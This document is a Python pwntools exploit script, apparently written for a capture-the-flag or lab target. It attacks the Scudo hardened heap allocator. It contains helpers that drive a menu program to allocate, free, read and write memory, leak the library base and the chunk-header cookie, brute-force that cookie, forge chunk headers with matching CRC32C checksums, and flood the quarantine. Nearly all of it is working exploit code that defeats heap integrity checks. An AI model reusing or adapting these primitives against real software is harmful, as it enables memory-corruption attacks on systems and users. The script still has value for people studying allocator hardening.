from pwn import *
from scudocookie import bruteforce, calc_checksum
from crc32c import crc32c


def malloc(io, size, data=b""):
    io.send(b"1\n")
    io.sendafter(b"allocate: ", f"{size}\n".encode())
    chunk = io.recvline()
    index = chunk.split(b' ')[4]
    address = int(chunk.split(b' ')[7], 16)
    if len(data) != 0:
        io.sendafter(b"quit\n", b"3\n")
        io.sendafter(b"address: ", b"2\n")
        io.sendafter(b"address: ", f"{hex(address)}\n".encode())
        io.sendafter(b"write: ", f"{len(data)}\n".encode())
        io.sendafter(b"write: ", data)
        io.send(b"\n")
    return (index, address)

# Send the "free" option, send the address
def free(io, address):
    io.send(b"2\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())

def write(io, address, data):
    io.send(b"3\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
    io.sendafter(b"write: ", f"{len(data)}\n".encode())
    io.sendafter(b"write: ", data)
    io.send(b"\n")

def read(io, address, size):
    io.send(b"4\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
    io.sendafter(b"read: ", f"{size}\n".encode())
    res = []
    for i in range((size//16)):
        res += [int(x, base=16) for x in io.recvline(keepends=False).split(b' ') if x != b'']
    return res

def get_libscudo_base(io, SCUDO_LIB ):
    scudo_base = io.libs()[os.path.realpath(SCUDO_LIB)]
    return scudo_base

def get_cookie_cheat(io, scudo_base):
    cookie = read(io, scudo_base+0x36000, 0x10)[0] # offset for libscudo-linux.so (md5sum: 6a1cb7efd0595861c21ca3cbd35e1657)
    return cookie 

def forge_header(address, cookie, new_header) -> bytes:
    new_checksum = calc_checksum(address, cookie, new_header) 
    crc = crc32c(new_header.to_bytes(8, 'little'), crc32c((address).to_bytes(8, 'little'), cookie))
    crc = crc ^ (crc >> 0x10)
    print(f'crc computed: {hex(crc)}')
    forged_header = new_header.to_bytes(6, 'little') + crc.to_bytes(2, 'little') + b"\0"*8 
    return forged_header    

def bruteforce_cookie(io, addr):
    header = read(io, addr-0x10, 0x10)[0]
    print(f"header {hex(header)}")

    checksum = header >> 0x30
    print(f'checksum: {hex(checksum)}')
    header = header & ((1 << 0x30)-1)
    print(f'header: {hex(header)}') 
    cookie = bruteforce(addr, checksum, header)

    return cookie

def populate_quarantine(io):
    for i in range(0x1000):
        free(io, malloc(io, 0x20+i)[1])
 